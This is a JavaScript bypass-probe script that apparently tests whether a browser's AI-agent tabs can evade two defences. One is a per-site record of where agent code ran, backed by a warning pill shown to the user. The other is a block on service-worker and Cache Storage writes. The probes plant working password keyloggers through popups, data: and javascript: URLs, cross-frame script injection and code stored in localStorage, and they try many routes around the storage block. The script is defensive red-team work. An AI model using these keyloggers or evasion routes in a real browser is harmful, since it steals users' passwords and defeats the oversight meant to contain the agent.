// Bypass probes for two own-tab defences (docs/research/own-tab.md), written
// before the defences landed:
// - record: zen-observe's record, by site, of where the agent ran its code
//   (5b23395), and zen-ux's pill, which asks it about every frame. Can the
//   agent's code reach a document whose site the record lacks, and read
//   what the user types there? Each probe prints, for the page the user
//   types in:
//   - the record's answer (agentCodeInPage);
//   - each document's site;
//   - what the pill says;
//   - what the agent's code caught.
// - storage: the refusal of serviceWorker.register and Cache put, add and
//   addAll in agent tabs (zen-observe). Can any caller still register a
//   service worker or write Cache Storage on the site's origin? Each vector
//   prints what the page saw, and what the origin holds afterwards, as read
//   from a tab of the user's.
// Dev profiles only: it clears the fixture origins' data after each probe.
//
//   scripts/zen-dev.sh zen-snapshot start
//   node tests/snapshot/tools/bypass-probe.mjs sameOriginKinds opaquePopup domPopup dataGoto jsGoto \
//     framedProvider framedLater
//   node tests/snapshot/tools/bypass-probe.mjs storageTop storageFrames storagePopup \
//     storageWorkers storageMore storageSiteWorkers storageWhileUserHolds
//   node tests/snapshot/tools/bypass-probe.mjs residualSiteSw residualStoredCode
//
// The first round's record bypasses, from the own tab's probe (removed with
// the own tab in f740de1):
// popupEvasion, blobEvasion and ssoNavigation.
import { openKit, runProbes } from "./owntab-kit.mjs";

const kit = await openKit();
const { call, chrome, ev, A, B, sleep, caught, handBack, cleanTabs, cleanUp, newTask } = kit;
const step = (...a) => console.error(new Date().toISOString().slice(11, 19), ...a);

/** A JS string literal that is safe inside an HTML <script> too. */
const js = v => JSON.stringify(v).replace(/</g, "\\u003c");

/** Page code: send each new value of #pw to the fixture's /caught, from any origin. */
const keylog = probe =>
  `setInterval(() => { const p = document.getElementById("pw"); if (p && p.value && p.value !== self.__sent) { self.__sent = p.value; new Image().src = ${js(`${A.base}/caught?probe=${probe}&v=`)} + encodeURIComponent(p.value); } }, 50)`;

/** The agent's own login page, with its keylogger. */
const fakeLogin = probe =>
  `<!doctype html><title>Site login</title><input type=password id=pw><script>${keylog(probe)}</script>`;

/**
 * The agent hands the task to the user, who reads the pill, then (after
 * `act`, chrome code that may use `t`, the pill's tab) types a password into
 * every field of the handed page. Ends with the user's Hand back.
 */
async function userTypes(s, probe, { act = "" } = {}) {
  step(probe, "hand off");
  await call("spaces.handOff", { space: s });
  const seen = await chrome(
    `
    await until(() => pillTab(arg.space), 5000).catch(() => {});
    const t = pillTab(arg.space);
    if (!t) return { error: "no pill" };
    const rec = ctx.spaces.peek(arg.space);
    const look = () => ({ url: t.linkedBrowser.currentURI.spec.slice(0, 64), record: AC.agentCodeInPage(rec, t.linkedBrowser), pill: pillInfo(t) });
    const atHandOff = look();
    ${act}
    await sleep(300);
    const atTyping = { ...look(), docs: docsOf(t.linkedBrowser, rec) };
    const typed = await typeEverywhere(t, arg.secret);
    return { atHandOff, atTyping, typed };
  `,
    { space: s, secret: `hunter2-${probe}` }
  );
  await sleep(700);
  const got = caught.filter(c => c.probe === probe).map(c => c.v);
  await handBack(s).catch(e => step(probe, "hand back failed:", e.message));
  const at = seen.atTyping;
  // The site warning, or the agent-made page's line (zen-ux's 3e66737).
  const warned = /ran its own code|The agent made this page/.test(at?.pill?.note ?? "");
  let verdict = "nothing caught";
  if (got.length) {
    verdict = !at?.record
      ? "BYPASS: the agent's code caught the password; the record lacks the page's sites"
      : warned
        ? "held: the pill warned"
        : "GAP: the record has the site, the pill is silent";
  }
  return { ...seen, caught: got, verdict };
}

/** The pages of a task, by label, and their URLs. */
async function pagesOf(s) {
  const list = await call("pages.list", { space: s });
  return (list?.pages ?? list ?? []).map(p => ({ label: p.label, url: String(p.url ?? "").slice(0, 64) }));
}

// ---------------------------------------------------------------------------
// The storage refusal: what a page tries, and what the origin holds after.

/**
 * Page or worker code. tryWrites(tag, g, base, natives) registers a service
 * worker at /sw-<tag>/ and puts /help?<tag> into the cache v-<tag>, through
 * the global `g`, with the given native functions if any.
 */
const WRITES = `async function tryWrites(tag, g, base, natives) {
  const out = {};
  const sw = g.navigator && g.navigator.serviceWorker;
  if (sw) {
    try {
      const opts = { scope: base + "/sw-" + tag + "/" };
      await (natives && natives.register ? natives.register.call(sw, base + "/sw-noop.js", opts) : sw.register(base + "/sw-noop.js", opts));
      out.register = "registered";
    } catch (e) { out.register = "refused: " + e.name + " " + String(e.message).slice(0, 70); }
  } else { out.register = "absent"; }
  try {
    const c = await g.caches.open("v-" + tag);
    const r = new g.Response("agent");
    await (natives && natives.put ? natives.put.call(c, base + "/help?" + tag, r) : c.put(base + "/help?" + tag, r));
    out.put = "stored";
  } catch (e) { out.put = "refused: " + e.name + " " + String(e.message).slice(0, 70); }
  return out;
}`;

/** Worker source that runs tryWrites(tag, self) and posts the outcome. */
const workerWrites = tag => `${WRITES}; tryWrites(${js(tag)}, self, ${js(A.base)}).then(r => postMessage(r));`;

/**
 * What the site's origin holds, seen from outside any agent tab: the service
 * workers registered under /sw-, and for each tag the entry /help?<tag> of
 * the cache v-<tag> (read in a tab of the user's).
 */
async function originHolds(tags) {
  const holds = await chrome(
    `
    const arr = Cc["@mozilla.org/serviceworkers/manager;1"].getService(Ci.nsIServiceWorkerManager).getAllRegistrations();
    const workers = [];
    for (let i = 0; i < arr.length; i++) {
      const info = arr.queryElementAt(i, Ci.nsIServiceWorkerRegistrationInfo);
      if (info.scope.startsWith(arg.base + "/sw-")) workers.push(info.scope.slice(arg.base.length));
    }
    const ws = gZenWorkspaces.getWorkspaces().find(w => !ctx.service.spaces.isAgentsSpace?.(w.uuid))?.uuid;
    const t = W.addBackgroundTab(win, ws);
    try {
      const url = Services.io.newURI(arg.base + "/help");
      t.linkedBrowser.loadURI(url, { triggeringPrincipal: Services.scriptSecurityManager.createContentPrincipal(url, {}) });
      await until(() => loaded(t), 10000);
      const caches = await inContent(t, "const out = {}; for (const tag of " + JSON.stringify(arg.tags) + ") { const r = await caches.match(" + JSON.stringify(arg.base) + " + '/help?' + tag, { cacheName: 'v-' + tag }); out[tag] = r ? (await r.text()).slice(0, 16) : null; } return out;");
      return { workers, caches };
    } finally {
      t.ownerDocument.defaultView.gBrowser.removeTab(t, { animate: false });
    }
  `,
    { base: A.base, tags }
  );
  const verdicts = {};
  for (const tag of tags) {
    const sw = holds.workers.includes(`/sw-${tag}/`);
    const cache = holds.caches?.[tag] != null;
    verdicts[tag] = sw || cache ? `BYPASS:${sw ? " service worker" : ""}${cache ? " cache entry" : ""}` : "refused";
  }
  return verdicts;
}

/** A storage probe: a fresh task on `url`, `run(s)` with the agent's calls, then what the origin holds for `tags`. */
/** Opens `url` in a background tab of the user's, runs `code` there in the page's world, and closes the tab. */
function userTabRun(url, code) {
  return chrome(
    `
    const ws = gZenWorkspaces.getWorkspaces().find(w => !ctx.service.spaces.isAgentsSpace?.(w.uuid))?.uuid;
    const t = W.addBackgroundTab(win, ws);
    try {
      const url = Services.io.newURI(arg.url);
      t.linkedBrowser.loadURI(url, { triggeringPrincipal: Services.scriptSecurityManager.createContentPrincipal(url, {}) });
      await until(() => loaded(t), 10000);
      return await inContent(t, arg.code);
    } finally {
      t.ownerDocument.defaultView.gBrowser.removeTab(t, { animate: false });
    }
  `,
    { url, code }
  );
}

async function storageProbe(name, url, tags, run) {
  await cleanTabs();
  const s = await newTask(name, url);
  try {
    const seen = await run(s);
    step(name, "reading the origin");
    return { seen, holds: await originHolds(tags) };
  } finally {
    await cleanUp([s]);
  }
}

const probes = {
  // -------------------------------------------------------------------------
  // The record

  /**
   * Every kind of document the agent's code can make on its own origin, each
   * with its keylogger: what site the record sees in each. Control case.
   */
  async sameOriginKinds() {
    const s = await newTask("same-origin kinds");
    try {
      const click = await call("page.click", { space: s, page: "p1", target: "#popBlank", options: {} });
      const p2 = click?.popups?.[0]?.label ?? null;
      step("sameOriginKinds: popup", p2);
      const made = await ev(
        s,
        "p1",
        `async () => {
        const fake = ${js(fakeLogin("sameOriginKinds"))};
        const frame = (name, set) => { const f = document.createElement("iframe"); f.name = name; set(f); document.body.append(f); return f; };
        const blank = frame("blank", () => {});
        blank.contentDocument.open(); blank.contentDocument.write(fake); blank.contentDocument.close();
        frame("srcdoc", f => (f.srcdoc = fake));
        frame("sandboxSameOrigin", f => { f.setAttribute("sandbox", "allow-scripts allow-same-origin allow-forms"); f.srcdoc = fake; });
        frame("sandboxOpaque", f => { f.setAttribute("sandbox", "allow-scripts allow-forms"); f.srcdoc = fake; });
        frame("data", f => (f.src = "data:text/html," + encodeURIComponent(fake)));
        frame("blob", f => (f.src = URL.createObjectURL(new Blob([fake], { type: "text/html" }))));
        frame("javascript", f => (f.src = "javascript:" + encodeURIComponent(JSON.stringify(fake))));
        // The page's own popup (about:blank on this origin), rewritten.
        if (window.__pb) { __pb.document.open(); __pb.document.write(fake); __pb.document.close(); }
        await new Promise(r => setTimeout(r, 800));
        return { frames: frames.length, popup: !!window.__pb };
      }`
      );
      const docs = await chrome(
        `
        const rec = ctx.spaces.peek(arg.space);
        const out = {};
        for (const label of arg.pages) {
          if (!label) continue;
          const { browser } = ctx.resolvePage({ space: arg.space, page: label });
          out[label] = { record: AC.agentCodeInPage(rec, browser), docs: docsOf(browser, rec) };
        }
        return out;
      `,
        { space: s, pages: ["p1", p2] }
      );
      return { made, docs };
    } finally {
      await cleanUp([s]);
    }
  },

  /**
   * A frame on an opaque origin runs the agent's code: a sandboxed frame
   * without allow-same-origin. Its button opens about:blank and writes the
   * agent's login page into it. The agent closes its first page and hands
   * the popup over.
   * - A popup that inherits the sandbox gets its own opaque origin, so the
   *   write fails (the spec's rule).
   * - With allow-popups-to-escape-sandbox, the popup's about:blank inherits
   *   the frame's opaque origin.
   */
  async opaquePopup() {
    const s = await newTask("opaque popup");
    try {
      const frameHtml = `<button id=opaqueOpen>Open</button><script>document.getElementById("opaqueOpen").onclick = () => { try { const w = window.open("about:blank", "opq"); w.document.write(${js(fakeLogin("opaquePopup"))}); w.document.close(); document.title = "wrote"; } catch (e) { document.title = "failed: " + e.name; } };</script>`;
      await ev(
        s,
        "p1",
        `() => {
        const f = document.createElement("iframe");
        f.name = "opaque";
        f.setAttribute("sandbox", "allow-scripts allow-popups allow-popups-to-escape-sandbox allow-forms");
        f.srcdoc = ${js(frameHtml)};
        document.body.append(f);
        return true;
      }`
      );
      await sleep(500);
      const click = await call("page.click", { space: s, page: "p1", target: "#opaqueOpen", options: {} });
      const p2 = click?.popups?.[0]?.label ?? null;
      step("opaquePopup: popup", p2);
      await sleep(500);
      const frameSaw = await chrome(
        `return ctx.content(ctx.resolvePage({ space: arg, page: "p1" }).browser.browsingContext.children[0], "dev#evalContent", { code: "return document.title" });`,
        s
      );
      await call("pages.close", { space: s, page: "p1" });
      const pages = await pagesOf(s);
      return { p2, frameSaw, pages, ...(await userTypes(s, "opaquePopup")) };
    } finally {
      await cleanUp([s]);
    }
  },

  /**
   * The agent's page opens an about:blank popup and builds its own login
   * page there through the DOM (no document.write, so the popup keeps
   * about:blank), keylogger included, then closes the opener.
   */
  async domPopup() {
    const s = await newTask("dom popup");
    try {
      const click = await call("page.click", { space: s, page: "p1", target: "#popBlank", options: {} });
      const p2 = click?.popups?.[0]?.label ?? null;
      step("domPopup: popup", p2);
      await sleep(300);
      const built = await ev(
        s,
        "p1",
        `() => {
        const d = window.__pb.document;
        d.title = "Site login";
        const pw = d.createElement("input");
        pw.type = "password";
        pw.id = "pw";
        d.body.append(pw);
        const el = d.createElement("script");
        el.textContent = ${js(keylog("domPopup"))};
        d.body.append(el);
        return d.URL;
      }`
      );
      await call("pages.close", { space: s, page: "p1" });
      return { p2, built, pages: await pagesOf(s), ...(await userTypes(s, "domPopup")) };
    } finally {
      await cleanUp([s]);
    }
  },

  /** The agent's goto to a data: URL of its own login page; no evaluate at all. */
  async dataGoto() {
    const s = await newTask("data goto");
    try {
      const url = "data:text/html," + encodeURIComponent(fakeLogin("dataGoto"));
      const nav = await call("page.goto", { space: s, page: "p1", url }).then(
        r => r?.url?.slice(0, 40) ?? "ok",
        e => `${e.code}: ${e.message}`
      );
      await sleep(400);
      return { nav, ...(await userTypes(s, "dataGoto")) };
    } finally {
      await cleanUp([s]);
    }
  },

  /** The agent's goto to a javascript: URL on site B, where it never evaluated. */
  async jsGoto() {
    const s = await newTask("javascript goto", `${B.base}/login`);
    try {
      const code = `void (document.documentElement.dataset.js = "agent", ${keylog("jsGoto")})`;
      const nav = await call("page.goto", {
        space: s,
        page: "p1",
        url: "javascript:" + encodeURIComponent(code),
        options: { timeout: 3000 },
      }).then(
        r => r?.url?.slice(0, 40) ?? "ok",
        e => `${e.code}: ${e.message.slice(0, 120)}`
      );
      await sleep(400);
      const ran = await chrome(
        `return inContent(ctx.resolvePage({ space: arg, page: "p1" }).tab, "return document.documentElement.dataset.js ?? null;");`,
        s
      );
      return { nav, ran, ...(await userTypes(s, "jsGoto")) };
    } finally {
      await cleanUp([s]);
    }
  },

  /**
   * A checkout page on site A frames its provider, site B. The agent's code
   * runs only on B, in a popup the page opened, and reaches the B frame
   * through window.opener. The agent never ran code on A.
   */
  async framedProvider() {
    const s = await newTask("framed provider", `${A.base}/framed`);
    try {
      await sleep(500);
      const click = await call("page.click", { space: s, page: "p1", target: "#popB", options: {} });
      const p2 = click?.popups?.[0]?.label ?? null;
      await call("page.waitForLoadState", { space: s, page: p2, state: "load" }).catch(() => {});
      const planted = await ev(
        s,
        p2,
        `() => {
        const d = window.opener[0].document;
        const el = d.createElement("script");
        el.textContent = ${js(keylog("framedProvider"))};
        d.body.append(el);
        return d.title;
      }`
      );
      await call("pages.close", { space: s, page: p2 });
      return { p2, planted, ...(await userTypes(s, "framedProvider")) };
    } finally {
      await cleanUp([s]);
    }
  },

  /**
   * The same, with the provider's frame added only after the hand off, when
   * the user asks for it. The agent's code waits in its B popup for that
   * frame.
   */
  async framedLater() {
    const s = await newTask("framed later", `${A.base}/framedLater`);
    try {
      const click = await call("page.click", { space: s, page: "p1", target: "#popB", options: {} });
      const p2 = click?.popups?.[0]?.label ?? null;
      await call("page.waitForLoadState", { space: s, page: p2, state: "load" }).catch(() => {});
      await ev(
        s,
        p2,
        `() => {
        setInterval(() => {
          try {
            const d = window.opener && window.opener[0] && window.opener[0].document;
            if (d && d.getElementById("pw") && !d.documentElement.dataset.planted) {
              d.documentElement.dataset.planted = "1";
              const el = d.createElement("script");
              el.textContent = ${js(keylog("framedLater"))};
              d.body.append(el);
            }
          } catch {}
        }, 50);
        return true;
      }`
      );
      // An acting call on p1 makes it the task's front page again.
      await call("page.click", { space: s, page: "p1", target: "#hello", options: {} });
      const act = `
        await inContent(t, "document.notifyUserGestureActivation(); document.getElementById('addB').click(); return true;", true);
        await until(() => t.linkedBrowser.browsingContext.children[0]?.currentWindowGlobal?.documentURI?.spec.endsWith("/login"), 8000);
        await sleep(400);
      `;
      return { p2, ...(await userTypes(s, "framedLater", { act })) };
    } finally {
      await cleanUp([s]);
    }
  },

  // -------------------------------------------------------------------------
  // The storage refusal

  /** The agent's page itself: register, and Cache put, add and addAll. */
  async storageTop() {
    const tags = ["top", "add", "addAll"];
    return storageProbe("storage top", `${A.base}/login`, tags, s =>
      ev(
        s,
        "p1",
        `async () => {
        ${WRITES}
        const base = ${js(A.base)};
        const out = { top: await tryWrites("top", window, base) };
        for (const [tag, write] of [["add", c => c.add(base + "/help?add")], ["addAll", c => c.addAll([base + "/help?addAll"])]]) {
          try { await write(await caches.open("v-" + tag)); out[tag] = "stored"; } catch (e) { out[tag] = "refused: " + e.name; }
        }
        return out;
      }`
      )
    );
  },

  /**
   * Frames the agent's code makes on its own origin:
   * - blankNow: a fresh about:blank frame's methods, used at once;
   * - blankGrab: that frame's native functions, called on the top
   *   document's objects;
   * - blankLater: the frame's methods half a second later;
   * - srcdoc and blob: frames whose own script writes;
   * - frameWindow: a frame of a real page, reached through its window.
   */
  async storageFrames() {
    const tags = ["blankNow", "blankGrab", "blankLater", "srcdoc", "blob", "frameWindow"];
    return storageProbe("storage frames", `${A.base}/login`, tags, s =>
      ev(
        s,
        "p1",
        `async () => {
        ${WRITES}
        const base = ${js(A.base)};
        const out = {};
        const frame = set => { const f = document.createElement("iframe"); set(f); document.body.append(f); return f; };
        const fresh = frame(() => {}).contentWindow;
        const natives = { register: fresh.ServiceWorkerContainer.prototype.register, put: fresh.Cache.prototype.put };
        const now = tryWrites("blankNow", fresh, base);
        out.blankGrab = await tryWrites("blankGrab", window, base, natives);
        out.blankNow = await now;
        await new Promise(r => setTimeout(r, 500));
        out.blankLater = await tryWrites("blankLater", fresh, base);
        const fromFrame = (tag, set) => new Promise(resolve => {
          const timer = setTimeout(() => resolve("no answer"), 4000);
          addEventListener("message", function on(e) { if (e.data && e.data.tag === tag) { removeEventListener("message", on); clearTimeout(timer); resolve(e.data.r); } });
          frame(set);
        });
        const own = tag => "<script>" + ${js(WRITES)} + "; tryWrites(" + JSON.stringify(tag) + ", window, " + JSON.stringify(base) + ").then(r => parent.postMessage({ tag: " + JSON.stringify(tag) + ", r }, '*'));<\\/script>";
        out.srcdoc = await fromFrame("srcdoc", f => (f.srcdoc = own("srcdoc")));
        out.blob = await fromFrame("blob", f => (f.src = URL.createObjectURL(new Blob([own("blob")], { type: "text/html" }))));
        const real = frame(f => (f.src = "/help"));
        await new Promise(r => (real.onload = r));
        out.frameWindow = await tryWrites("frameWindow", real.contentWindow, base);
        return out;
      }`
      )
    );
  },

  /**
   * Popups on the agent's origin:
   * - popupNow: one the agent's own click listener opens and uses at once;
   * - popupGrab: its native functions on the opener's objects;
   * - popupLater: the page's about:blank popup, used half a second later;
   * - popupNav: a popup of a real page.
   */
  async storagePopup() {
    const tags = ["popupNow", "popupGrab", "popupLater", "popupNav"];
    return storageProbe("storage popup", `${A.base}/login`, tags, async s => {
      await ev(
        s,
        "p1",
        `() => {
        ${WRITES}
        window.tryWrites = tryWrites;
        const base = ${js(A.base)};
        const b = document.createElement("button");
        b.id = "agentOpen";
        b.textContent = "Open";
        b.onclick = () => {
          const w = window.open("", "agentPopup");
          window.__now = tryWrites("popupNow", w, base);
          window.__natives = { register: w.ServiceWorkerContainer.prototype.register, put: w.Cache.prototype.put };
        };
        document.body.append(b);
        return true;
      }`
      );
      await call("page.click", { space: s, page: "p1", target: "#agentOpen", options: {} });
      await call("page.click", { space: s, page: "p1", target: "#popBlank", options: {} });
      await call("page.click", { space: s, page: "p1", target: "#pop", options: {} });
      return ev(
        s,
        "p1",
        `async () => {
        const base = ${js(A.base)};
        const out = { popupNow: await window.__now };
        out.popupGrab = await tryWrites("popupGrab", window, base, window.__natives);
        await new Promise(r => setTimeout(r, 500));
        out.popupLater = await tryWrites("popupLater", window.__pb, base);
        for (let i = 0; i < 100 && !(window.__pop.document.readyState === "complete" && window.__pop.location.pathname === "/login"); i++) await new Promise(r => setTimeout(r, 50));
        out.popupNav = await tryWrites("popupNav", window.__pop, base);
        return out;
      }`
      );
    });
  },

  /** Workers the agent's code starts: dedicated, shared, and a worker's nested worker. */
  async storageWorkers() {
    const tags = ["dedicated", "shared", "nested"];
    return storageProbe("storage workers", `${A.base}/login`, tags, s =>
      ev(
        s,
        "p1",
        `async () => {
        const url = src => URL.createObjectURL(new Blob([src], { type: "text/javascript" }));
        const answer = (target, port) => new Promise(resolve => {
          const timer = setTimeout(() => resolve("no answer"), 4000);
          (port || target).onmessage = e => { clearTimeout(timer); resolve(e.data); };
          target.onerror = e => { clearTimeout(timer); resolve("error: " + (e.message || "failed")); };
        });
        const out = {};
        out.dedicated = await answer(new Worker(url(${js(workerWrites("dedicated"))})));
        const shared = new SharedWorker(url("onconnect = e => { const p = e.ports[0]; " + ${js(WRITES)} + "; tryWrites('shared', self, " + ${js(js(A.base))} + ").then(r => p.postMessage(r)); };"));
        const reply = answer(shared, shared.port);
        shared.port.start();
        out.shared = await reply;
        const outer = "const inner = new Worker(URL.createObjectURL(new Blob([" + ${js(js(workerWrites("nested")))} + "], { type: 'text/javascript' }))); inner.onmessage = e => postMessage(e.data); inner.onerror = e => postMessage('inner error: ' + e.message);";
        out.nested = await answer(new Worker(url(outer)));
        return out;
      }`
      )
    );
  },

  /**
   * More of the agent's own workers and frames:
   * - module: a module worker;
   * - frameWorker: a worker built from a fresh frame's realm;
   * - siteFrame: a frame of a real page of the site, once it has loaded;
   * - siteScript: the site's own worker script, started by the agent's code.
   */
  async storageMore() {
    const tags = ["module", "frameWorker", "siteFrame", "siteScript"];
    return storageProbe("storage more", `${A.base}/login`, tags, s =>
      ev(
        s,
        "p1",
        `async () => {
        ${WRITES}
        const url = src => URL.createObjectURL(new Blob([src], { type: "text/javascript" }));
        const answer = target => new Promise(resolve => {
          const timer = setTimeout(() => resolve("no answer"), 4000);
          target.onmessage = e => { clearTimeout(timer); resolve(e.data); };
          target.onerror = e => { clearTimeout(timer); resolve("error: " + (e.message || "failed")); };
        });
        const out = {};
        out.module = await answer(new Worker(url(${js(workerWrites("module"))}), { type: "module" }));
        const f = document.createElement("iframe");
        document.body.append(f);
        out.frameWorker = await answer(new f.contentWindow.Worker(url(${js(workerWrites("frameWorker"))})));
        const g = document.createElement("iframe");
        g.src = "/help";
        await new Promise(r => { g.onload = r; document.body.append(g); });
        out.siteFrame = await tryWrites("siteFrame", g.contentWindow, ${js(A.base)});
        const w = new Worker("/cache-helper.js");
        const done = answer(w);
        w.postMessage({ cache: "v-siteScript", url: ${js(A.base)} + "/help?siteScript", body: "agent", type: "text/plain" });
        out.siteScript = await done;
        return out;
      }`
      )
    );
  },

  /**
   * Residual: the site's own service worker, which the user registered on
   * an earlier visit, controls the agent's pages too, and caches for them:
   * what they fetch (a runtime cache), and what they ask it to save.
   */
  async residualSiteSw() {
    await cleanTabs();
    const registered = await userTabRun(
      `${A.base}/rt/page`,
      `const ready = await Promise.race([navigator.serviceWorker.ready.then(() => "ready"), new Promise(r => setTimeout(() => r("timed out"), 5000))]);
       return { ready, scope: (await navigator.serviceWorker.getRegistration("/rt/"))?.scope ?? null };`
    );
    const s = await newTask("residual site sw", `${A.base}/rt/page`);
    try {
      const agent = await ev(
        s,
        "p1",
        `async () => {
        const controlled = !!navigator.serviceWorker.controller;
        const fetched = await fetch("/rt/item?agent-fetch").then(r => r.text());
        navigator.serviceWorker.controller?.postMessage({ saveForOffline: ["/rt/item?agent-message"] });
        await new Promise(r => setTimeout(r, 1000));
        return { controlled, fetched };
      }`
      );
      const holds = await userTabRun(
        `${A.base}/help`,
        `const c = await caches.open("rt"); return (await c.keys()).map(k => { const u = new URL(k.url); return u.pathname + u.search; });`
      );
      return { registered, agent, userCacheHolds: holds };
    } finally {
      await cleanUp([s]);
    }
  },

  /**
   * Residual: site data the site runs as code. The site keeps its own code
   * in localStorage and runs it on each visit (the lscache pattern). The
   * agent's code rewrites it during the task. After the task, the user
   * signs in on the site in a tab of their own.
   */
  async residualStoredCode() {
    await cleanTabs();
    const s = await newTask("residual stored code", `${A.base}/lscode`);
    let open = true;
    try {
      await ev(s, "p1", `() => { localStorage.setItem("app-code", ${js(keylog("residualStoredCode"))}); return true; }`);
      await call("spaces.finish", { space: s, keep: [] });
      open = false;
      const user = await userTabRun(
        `${A.base}/lscode`,
        `document.getElementById("pw").value = "hunter2-residualStoredCode"; await new Promise(r => setTimeout(r, 1500)); return document.title;`
      );
      await sleep(500);
      return { userTabTitle: user, caught: caught.filter(c => c.probe === "residualStoredCode").map(c => c.v) };
    } finally {
      if (open) {
        await cleanUp([s]);
      } else {
        await cleanTabs();
      }
    }
  },

  /**
   * Workers that the agent's code didn't start, asked to write for it:
   * - siteWorker: the page's own worker, started before the agent's code ran;
   * - userShared: the site's shared worker, which the user's own tab
   *   started.
   */
  async storageSiteWorkers() {
    const tags = ["siteWorker", "userShared"];
    return storageProbe("storage site workers", `${A.base}/app2`, tags, async s => {
      const userTab = await chrome(
        `
        const ws = gZenWorkspaces.getWorkspaces().find(w => !ctx.service.spaces.isAgentsSpace?.(w.uuid))?.uuid;
        const t = W.addBackgroundTab(win, ws);
        const url = Services.io.newURI(arg + "/help");
        t.linkedBrowser.loadURI(url, { triggeringPrincipal: Services.scriptSecurityManager.createContentPrincipal(url, {}) });
        await until(() => loaded(t), 10000);
        return inContent(t, "window.__w = new SharedWorker('/shared-cache.js', 'cache-sync'); __w.port.start(); return true;");
      `,
        A.base
      );
      const seen = await ev(
        s,
        "p1",
        `async () => {
        const base = ${js(A.base)};
        const ask = (port, tag) => new Promise(resolve => {
          const timer = setTimeout(() => resolve("no answer"), 4000);
          port.onmessage = e => { clearTimeout(timer); resolve(e.data); };
          port.postMessage({ cache: "v-" + tag, url: base + "/help?" + tag, body: "agent", type: "text/plain" });
        });
        const out = { siteWorker: await ask(window.siteWorker, "siteWorker") };
        const w = new SharedWorker(base + "/shared-cache.js", "cache-sync");
        w.port.start();
        out.userShared = await ask(w.port, "userShared");
        return out;
      }`
      );
      return { userTab, ...seen };
    });
  },

  /**
   * The agent's code waits for the user: a page timer and a worker retry the
   * writes every 250 ms. The origin is read while the agent drives, then
   * while the user holds the task.
   */
  async storageWhileUserHolds() {
    await cleanTabs();
    const tags = ["heldPage", "heldWorker"];
    const s = await newTask("storage while the user holds");
    try {
      await ev(
        s,
        "p1",
        `() => {
        ${WRITES}
        const base = ${js(A.base)};
        window.__held = { page: [], worker: [] };
        const t = setInterval(async () => {
          const r = await tryWrites("heldPage", window, base);
          __held.page.push(r);
          if ((r.register === "registered" && r.put === "stored") || __held.page.length > 60) clearInterval(t);
        }, 250);
        const src = ${js(WRITES)} + "; let n = 0; const t = setInterval(async () => { const r = await tryWrites('heldWorker', self, " + ${js(js(A.base))} + "); postMessage(r); if (r.put === 'stored' || ++n > 60) clearInterval(t); }, 250);";
        const w = new Worker(URL.createObjectURL(new Blob([src], { type: "text/javascript" })));
        w.onmessage = e => __held.worker.push(e.data);
        return true;
      }`
      );
      await sleep(1000);
      const whileAgentDrives = await originHolds(tags);
      step("storageWhileUserHolds: hand off");
      await call("spaces.handOff", { space: s });
      await sleep(2000);
      const whileUserHolds = await originHolds(tags);
      await handBack(s);
      const log = await ev(s, "p1", "() => ({ attempts: __held.page.length, page: __held.page.slice(-1), worker: __held.worker.slice(-1) })");
      return { whileAgentDrives, whileUserHolds, log };
    } finally {
      await cleanUp([s]);
    }
  },
};

await runProbes(probes, process.argv.slice(2), kit);
